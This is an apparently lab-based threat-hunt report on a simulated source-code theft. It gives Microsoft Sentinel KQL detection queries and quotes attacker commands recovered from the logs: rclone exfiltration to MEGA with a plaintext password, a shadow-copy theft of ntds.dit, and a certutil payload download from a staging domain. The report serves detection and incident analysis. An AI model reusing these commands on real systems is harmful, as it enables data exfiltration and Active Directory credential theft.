# Threat Hunt Report – EmberForge Source Leak Investigation

# Environment Details

| Item                 | Value                                       |
| -------------------- | ------------------------------------------- |
| SIEM Platform        | Microsoft Sentinel                          |
| Workspace            | law-cyber-range                             |
| Investigation Window | 2026-01-30 21:00 UTC – 2026-01-31 00:00 UTC |
| Custom Log Table     | EmberForgeX_CL                              |

---

# 1. Custom Log Table Identification

## Query Used

```kql
search *
| summarize count() by $table
```

## Findings

* Identified custom investigation table:

```text
EmberForgeX_CL
```

### Screenshot

(Add screenshot here)

---

# 2. Data Collection & Archive Creation

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has_any ("zip", "rar", "7z", "tar", "archive", "compress")
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| order by TimeGenerated asc
```


### Screenshot

<img width="566" height="181" alt="image" src="https://github.com/user-attachments/assets/c6154893-fc2d-4ac4-a439-aff11771ee81" />

---

# 3. Exfiltration Tool Discovery

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has "rclone"
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| order by TimeGenerated asc
```


### Screenshot

<img width="1014" height="325" alt="image" src="https://github.com/user-attachments/assets/3d01643f-35c4-4686-ace2-2c43c3da28a1" />


---

# 4. Attacker Email Attribution

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has "rclone"
| project TimeGenerated, Computer, EventCode_s, CommandLine_s
| order by TimeGenerated asc
```

## Evidence Identified

```cmd
cmd.exe /c "echo user = jwilson.vhr@proton.me>> C:\Users\Public\rclone.conf"
```

## Findings

| Artifact       | Value                                                 |
| -------------- | ----------------------------------------------------- |
| Attacker Email | [jwilson.vhr@proton.me](mailto:jwilson.vhr@proton.me) |

### Screenshot

(Add screenshot here)

---

# 5. Plaintext Credential Exposure

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has_any ("pass", "password", "mega-pass", "config create")
| project TimeGenerated, Computer, CommandLine_s
| order by TimeGenerated asc
```

## Evidence Identified

```cmd
C:\Users\Public\rclone.exe copy C:\GameDev mega:exfil --mega-user jwilson.vhr@proton.me --mega-pass Summer2024! -v
```

## Findings

| Artifact           | Value                                                 |
| ------------------ | ----------------------------------------------------- |
| Username           | [jwilson.vhr@proton.me](mailto:jwilson.vhr@proton.me) |
| Plaintext Password | Summer2024!                                           |

### Screenshot

(Add screenshot here)

---

# 6. Exfiltration Destination IP

## Query Used

```kql
EmberForgeX_CL
| where EventCode_s == "3"
| where Image_s has "rclone"
| project TimeGenerated,
          Computer,
          Image_s,
          DestinationIp_s,
          DestinationPort_s
| order by TimeGenerated asc
```

## Findings

| Artifact       | Value         |
| -------------- | ------------- |
| Destination IP | 66.203.125.15 |

### Screenshot

(Add screenshot here)

---

# 7. Active Directory Credential Database Theft

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has_any ("vssadmin", "shadow", "ntds", "diskshadow", "copy")
| project TimeGenerated, Computer, Caller_User_Name_s, CommandLine_s
| order by TimeGenerated asc
```

## Evidence Identified

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\nyMdRNSp.tmp
```

## Findings

| Artifact            | Value    |
| ------------------- | -------- |
| Credential Database | ntds.dit |

### Screenshot

(Add screenshot here)

---

# 8. Staging Infrastructure Discovery

## Query Used

```kql
EmberForgeX_CL
| where CommandLine_s has_any (
    "Invoke-WebRequest",
    "iwr",
    "curl",
    "wget",
    "certutil",
    "bitsadmin",
    "download"
)
| project TimeGenerated, Computer, CommandLine_s
| order by TimeGenerated asc
```

## Evidence Identified

```cmd
certutil -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\Users\Public\update.exe
```

## Findings

| Artifact           | Value                   |
| ------------------ | ----------------------- |
| Staging Server     | sync.cloud-endpoint.net |
| Downloaded Payload | update.exe              |

### Screenshot

(Add screenshot here)

---

# 9. DNS Infrastructure Correlation

## Query Used

```kql
EmberForgeX_CL
| where EventCode_s == "22"
| where QueryName_s !contains "emberforge.local"
| summarize count() by QueryName_s
| order by count_ desc
```

## Findings

| Artifact        | Value                   |
| --------------- | ----------------------- |
| External Domain | sync.cloud-endpoint.net |

### Screenshot

(Add screenshot here)

---

# Indicators of Compromise (IOCs)

| Type                | Value                                                 |
| ------------------- | ----------------------------------------------------- |
| Domain              | sync.cloud-endpoint.net                               |
| IP Address          | 66.203.125.15                                         |
| Email               | [jwilson.vhr@proton.me](mailto:jwilson.vhr@proton.me) |
| Tool                | rclone.exe                                            |
| Tool                | update.exe                                            |
| Archive             | gamedev.zip                                           |
| Sensitive Directory | C:\GameDev                                            |

---

# MITRE ATT&CK Techniques Observed

| Technique                     | ID        |
| ----------------------------- | --------- |
| PowerShell                    | T1059.001 |
| Command Shell                 | T1059.003 |
| Data from Local System        | T1005     |
| Archive via Utility           | T1560.001 |
| Exfiltration to Cloud Storage | T1567.002 |
| Ingress Tool Transfer         | T1105     |
| NTDS Credential Dumping       | T1003.003 |
| Unsecured Credentials         | T1552     |

---

# Conclusion

The investigation confirmed successful compromise activity involving:

* malicious tool transfer,
* archive staging,
* cloud exfiltration,
* credential exposure,
* and Active Directory credential theft.

The attacker leveraged Living Off The Land techniques and legitimate administrative tooling to evade detection while staging and exfiltrating sensitive company data.
